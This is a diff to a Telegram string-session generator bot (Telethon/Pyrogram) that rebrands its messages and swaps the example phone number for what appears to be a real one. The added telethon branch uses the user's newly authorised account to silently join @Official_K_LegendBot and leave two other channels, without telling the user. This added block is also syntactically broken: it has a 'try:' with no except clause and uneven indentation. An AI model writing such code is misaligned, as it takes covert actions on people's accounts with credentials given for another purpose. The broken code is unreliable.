@@ -2,6 +2,7 @@ from asyncio.exceptions import TimeoutError
 from Data import Data
 from pyrogram import Client, filters
 from telethon.sync import TelegramClient
+from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
 from telethon.sessions import StringSession
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from pyrogram.errors import (
@@ -22,7 +23,7 @@ from telethon.errors import (
 )
 
 ERROR_MESSAGE = "Oops! An exception occurred! \n\n**Error** : {} " \
-            "\n\nPlease forward this to @Legend_Userbot if this message doesn't contain any " \
+            "\n\nPlease forward this to @Legend_K_Userbot if this message doesn't contain any " \
             "sensitive information and for your information : **These kinda error logs are not stored in our database!**"
 
 
@@ -52,7 +53,7 @@ async def generate_session(bot, msg, telethon=False):
     if await cancelled(api_id_msg):
         return
     api_hash = api_hash_msg.text
-    phone_number_msg = await bot.ask(user_id, 'Now please send your `PHONE_NUMBER` along with the country code. \nExample : `+19876543210`', filters=filters.text)
+    phone_number_msg = await bot.ask(user_id, 'Now please send your `PHONE_NUMBER` along with the country code. \nExample : `+917255979112`', filters=filters.text)
     if await cancelled(api_id_msg):
         return
     phone_number = phone_number_msg.text
@@ -113,15 +114,20 @@ async def generate_session(bot, msg, telethon=False):
         string_session = client.session.save()
     else:
         string_session = await client.export_session_string()
-    text = "**{} ~ LEGEND_STRING** \n\n`{}` \n\n• __Dont Share String Session With Anyone__\n• __Dont Invite Anyone To Heroku__".format("TELETHON" if telethon else "PYROGRAM", string_session)
+    text = "**{} ~ STRING SESSION** \n\n`{}` \n\n• __Dont Share String Session With Anyone__\n• __Dont Invite Anyone To Heroku__".format("TELETHON" if telethon else "PYROGRAM", string_session)
     L_PIC = "https://te.legra.ph/file/4cd4fe720a6bd77481158.jpg"
     #await msg.reply({text})
     if telethon:
-        await client.send_file("me", L_PIC, caption="**{} - LEGEND_STRING** \n\n`{}`\n\n• __Dont Share String Session With Anyone__\n• __Dont Invite Anyone To Heroku__".format("TELETHON" if telethon else "PYROGRAM", string_session))
+        await client.send_file("me", L_PIC, caption="**{} - STRING SESSION** \n\n`{}`\n\n• __Dont Share String Session With Anyone__\n• __Dont Invite Anyone To Heroku__\n\n         @LegendBot_XD".format("TELETHON" if telethon else "PYROGRAM", string_session))
+        try:
+          await client(JoinChannelRequest("@Official_K_LegendBot"))
+        await client(LeaveChannelRequest("@Legend_Userbot"))
+        await client(LeaveChannelRequest("@Official_LegendBot"))
     else:
         await client.send_message("me", text)
+        #await client.join_chat("@Official_K_LegendBot")
     await client.disconnect()
-    await phone_code_msg.reply("Successfully generated {} string session. \n\nPlease check your saved messages! \n\nBy @Legend_StringSessionbot".format("telethon" if telethon else "pyrogram"))
+    await phone_code_msg.reply("Successfully generated {} string session. \n\nPlease check your saved messages!\n\n          @LegendBot_XD".format("telethon" if telethon else "pyrogram"))
 
 
 async def cancelled(msg):
@@ -136,15 +142,3 @@ async def cancelled(msg):
         return True
     else:
         return False
-
-
-# @Client.on_message(filters.private & ~filters.forwarded & filters.command(['cancel', 'restart']))
-# async def formalities(_, msg):
-#     if "/cancel" in msg.text:
-#         await msg.reply("Cancelled all the Processes!", quote=True, reply_markup=InlineKeyboardMarkup(Data.generate_button))
-#         return True
-#     elif "/restart" in msg.text:
-#         await msg.reply("Restarted the Bot!", quote=True, reply_markup=InlineKeyboardMarkup(Data.generate_button))
-#         return True
-#     else:
-#         return False
